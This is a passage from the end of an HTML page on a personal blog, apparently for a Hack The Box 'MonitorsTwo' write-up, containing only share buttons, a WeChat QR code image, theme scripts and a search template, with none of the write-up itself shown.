          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《MonitorsTwo - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2023/05/07/Hackthebox%20-%20MonitorsTwo/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAAClklEQVR42u3a0U7jQAwF0P7/T8MzFML12E6pdPK0Upt0zqwUm+t5POLr4+l6/jS56/kJyafXvzJw4eHh4bWXfr2I3+6d+ub1OvM14+Hh4W3zksdtLGK2SODh4eG9Cy9/TV8XhutygoeHh/e+vKQ5TrajGnzg4eHh/TfeVON79orPi8Ri1oKHh4cX884ihtf+e2W+h4eHh9eeqicv3PwYQTL0qh4v+GO1eHh4eAu8/IXbYXfGWtV2GQ8PD+8eXufRZ8vNg93OqvDw8PDu5HUa5c447SzSjcobHh4e3jIvPyKQf/+stJwFFnh4eHjbvATWGf9Xn5Y33OXZHR4eHl6bV41Wz45h5duXb0q0fjw8PLxbeNWG9fo71Y3rByLlQ1d4eHh4R7wzcD6+ylvqqab8S2HAw8PDG+V1wog8uq1GCf3v4+Hh4e3xOk1wdXH5q38s/sDDw8O7hbfByAOIamH4o/zg4eHhrfE2BlpncW0eFkf34uHh4S3wZl/6Z61zMtbKQ+QIiYeHhzfEqxaGHDbbjufFDA8PD2+DV218Z5vps4FZ4fgCHh4e3gKvEz3MjseqpaVwLx4eHt4Cr7q4fCM6d0XHqvItxsPDw7uF1w9Pq1uQ/0oSE+Ph4eHt8fI9qG5Bclc+VDtr4vHw8PD2ePlPnhWMqZY9adzx8PDw7uFVA9NH8Tpr2atRBR4eHt4276N4JS/0ZEfzQKFaZn44dIWHh4c3yusM5meb7JUYAg8PD2+NlwcQZ6Ov2dA2j5jx8PDwtnn5H/nVqLdzdGCspuHh4eG9lHf2nGrMkcQZrQEYHh4e3u28PKitFps8yIj+A/Dw8PDWeNUWeerTZDBWLT94eHh427zOX/SdEVf/UMJ6YIGHh4f3/foEJ9xUuYXet40AAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
